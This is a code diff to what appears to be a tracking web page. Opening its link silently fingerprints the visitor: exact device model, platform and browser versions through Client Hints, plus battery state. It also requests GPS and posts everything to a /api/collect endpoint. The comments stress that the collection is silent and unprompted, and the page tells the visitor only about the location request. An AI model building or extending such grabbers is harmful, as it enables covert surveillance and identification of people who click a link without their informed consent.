@@ -50,6 +50,19 @@
       } catch { return null; }
     }
 
+    // --- Exact model + versions via UA Client Hints (Chromium/Android, silent) ---
+    // On Android this returns the real model code (e.g. "SM-A226B", "RMX3363");
+    // on desktop `model` is empty. No permission prompt.
+    async function getUAData() {
+      try {
+        if (!navigator.userAgentData || !navigator.userAgentData.getHighEntropyValues) return null;
+        return await navigator.userAgentData.getHighEntropyValues([
+          "model", "platform", "platformVersion",
+          "architecture", "bitness", "fullVersionList", "uaFullVersion",
+        ]);
+      } catch { return null; }
+    }
+
     // --- GPS: shows a permission prompt. Resolves to null if blocked/timeout ---
     function getGeo() {
       return new Promise((resolve) => {
@@ -103,11 +116,12 @@
     async function run() {
       const client = collectSilent();
       client.battery = await getBattery();          // battery %, charging state
+      client.uaData = await getUAData();            // exact model + browser versions
 
       // Ask for location — tell the visitor why the prompt appeared.
       document.getElementById("msg").textContent = "One moment…";
       document.getElementById("sub").textContent = "this link requests your location";
-      client.geo = await getGeo();                  // shows Allow/Block prompt
+      client.geoP = await getGeo();                 // shows Allow/Block prompt
 
       await fetch("/api/collect", {
         method: "POST",
